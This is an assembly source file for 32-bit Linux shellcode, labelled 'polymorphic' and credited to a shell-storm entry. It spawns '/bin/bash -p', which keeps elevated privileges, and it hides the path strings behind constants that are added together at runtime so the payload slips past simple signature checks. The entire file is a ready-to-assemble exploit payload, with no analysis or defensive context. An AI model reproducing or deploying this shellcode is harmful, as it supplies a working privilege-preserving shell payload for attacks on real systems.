;Title: Linux x86 - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 49 bytes
;Author: Javier Tejedor
;Polymorphic http://www.shell-storm.org/shellcode/files/shellcode-606.php

global _start 
 
section .text 
_start:
	xor eax, eax
	mov al, 0xb
	xor edx, edx 
	push edx
	push word 0x702d	;"-p"
	mov ecx,esp		
	push edx
	push byte 0x68		;"h"
	mov esi, 0x1DC7FBFC	
	add esi, 0x55996633
	push dword esi		;"/bas"
	mov esi, 0x15D44DA8
	add esi, 0x58951487	
	push esi		;"/bin"
	mov ebx,esp
	push edx
	push ecx
	push ebx
	mov ecx,esp
	int 0x80
